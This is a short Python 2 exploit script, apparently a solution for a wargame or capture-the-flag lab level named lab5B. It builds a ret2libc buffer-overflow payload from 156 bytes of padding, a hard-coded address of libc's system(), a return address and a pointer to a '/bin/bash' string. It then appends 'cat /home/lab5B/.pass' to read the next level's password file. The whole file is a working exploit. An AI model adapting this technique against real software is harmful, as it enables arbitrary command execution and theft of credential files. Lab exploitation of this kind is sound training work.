import struct


def main():
    # | BUFFER | OVERWRITED RETADDR -> SYSTEM | RETADDR FROM NEW FUNCTION | COMMAND TO EXECUTE
    # libc: 0xb7f83a24("/bin/sh")
    # [stack]: 0xbffff84e("/bin/bash")

    libc_system_addr = 0xb7e63190
    main_ret_addr = 0xb7e3ca83
    bin_bash_str = 0xbffff84e
    flag_path_cmd = 'cat /home/lab5B/.pass'

    full_payload = 'A' * 156 + \
                   struct.pack('<I', libc_system_addr) + \
                   struct.pack('<I', main_ret_addr) + \
                   struct.pack('<I', bin_bash_str) + \
                   flag_path_cmd

    print full_payload

if __name__ == "__main__":
    main()
